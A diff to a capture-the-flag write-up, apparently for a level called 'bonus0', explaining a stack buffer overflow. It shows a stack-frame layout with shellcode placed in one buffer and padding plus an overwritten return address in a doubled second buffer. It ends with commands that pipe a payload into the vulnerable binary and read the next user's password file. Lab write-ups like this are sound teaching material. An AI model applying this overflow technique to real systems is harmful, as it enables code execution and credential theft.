@@ -84,14 +84,38 @@ void one_buffer()
 
 In this example, the two functions do exactly the same thing.  And because C strings are NUL terminated, having 20 non-NUL bytes in `buf1` then 5 non-NUL bytes and 1 NUL in `buf2` will make a 25-byte C string.
 
-Here is what the stack frame of `main` should look like:
+The stack frame of `main` should look like this:
 
 ```
-| buffer    | 42 |  0 |
-| alignment |  8 | 42 |
-| ebp       |  4 | 50 |
-| eip       |  4 | 54 |
-| <end>     |  0 | 58 |
+| Element   | Size | Offset |
+| --------- | ---- | ------ |
+| buffer    |   42 |      0 |
+| alignment |    8 |     42 |
+| ebp       |    4 |     50 |
+| eip       |    4 |     54 |
+| <end>     |    0 |     58 |
+
 ```
 
-XXX this does not align with working payload, calculations are wrong
+We can use the first read for our shellcode, 20 bytes is plenty.  Then the second read (which is copied twice into the destination buffer) can be used for padding and overwriting the return address.  We can represent the layout of the stack frame of main, the layout of the buffers of `pp` and their contents like this:
+
+```
+    5   10   15   20   25   30   35   40   45   50   55   60
+----|----|----|----|----|----|----|----|----|----|----|----|
+[ buf1             ][ buf2             ][ buf2             ]
+    |    |    |    |    |    |    |    |    |    |    |    |
+[ main buffer                            ][ algn ][bp][ip]
+XXXXXXXXXXXXXXXXXXXXAAAAAAAAAAAAAA****B AAAAAAAAAAAAAA****B
+----|----|----|----|----|----|----|----|----|----|----|----|
+
+Legend:
+  X = shellcode
+  A = padding before address
+  B = padding after address
+  * = address
+```
+
+```sh
+cat /tmp/payload-bonus0.bin - | env -i ~/bonus0
+cat ~bonus1/.pass
+```
